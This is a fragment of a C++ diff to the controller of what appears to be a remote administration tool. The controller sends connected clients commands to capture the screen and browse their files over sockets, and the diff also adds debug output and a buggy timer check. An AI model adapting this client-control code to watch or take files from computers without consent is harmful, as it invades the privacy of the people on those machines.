+            if (strrchr(buffer, '\\') == buffer + len - 2) // Check if last character is backslash
+            {
                 ftpmenu.UpdateItems(FtpHwnd, hFtpList, buffer, len);
                 KillTimer(FtpHwnd, 1440);
             }
-            else if (len == 0)
-            {
-                // Client disconnected
-                closesocket(FTPSOCK);
-            }
-            KillTimer(FtpHwnd, 1440);
+            //KillTimer(FtpHwnd, 1440);
+        }
+
+        else if (LOWORD(wParam == 1441))
+        {
+
+            KillTimer(FtpHwnd, 1441);
         }
 
         break;
@@ -1252,6 +1349,7 @@ LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM
 
     case WM_DESTROY:
     {
+        send(FTPSOCK, "startscreen", strlen("startscreen"), 0);
         allSelectedNames = L"";
         DestroyWindow(hwndFTP);
         break;
@@ -1294,10 +1392,12 @@ LRESULT CALLBACK ClientWndProc(HWND Chwnd, UINT uMsg, WPARAM wParam, LPARAM lPar
         {
             SOCKET selectedSocket = clientSockets[itemIndex];
             auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
-            send(selectedSocket, "capscr", strlen("capscr"), 0);
+            int ss = send(selectedSocket, "capscr", strlen("capscr"), 0);
+            std::string s = "send() returned " + std::to_string(ss) + "\n";
+            OutputDebugStringA(s.c_str());
 
             InvalidateRect(Chwnd, NULL, TRUE);
-
+            UpdateWindow(Chwnd);
         }
         break;
     }
@@ -1306,7 +1406,7 @@ LRESULT CALLBACK ClientWndProc(HWND Chwnd, UINT uMsg, WPARAM wParam, LPARAM lPar
     {
         int bufferLen = 0;
         const int MAX_BYTES = 100000;
-        Sleep(FPS);
+
         do
         {
             SOCKET selectedSocket = clientSockets[itemIndex];
@@ -1314,7 +1414,7 @@ LRESULT CALLBACK ClientWndProc(HWND Chwnd, UINT uMsg, WPARAM wParam, LPARAM lPar
             ULONGLONG bufferLenNetworkOrder = 0;
             int bytesReceived = 0;
             int rerr = 0;
-           
+
             while (bytesReceived < sizeof(bufferLenNetworkOrder)) {
                 rerr = recv(selectedSocket, (char*)&bufferLenNetworkOrder + bytesReceived, sizeof(bufferLenNetworkOrder) - bytesReceived, 0);
                 bytesReceived += rerr;
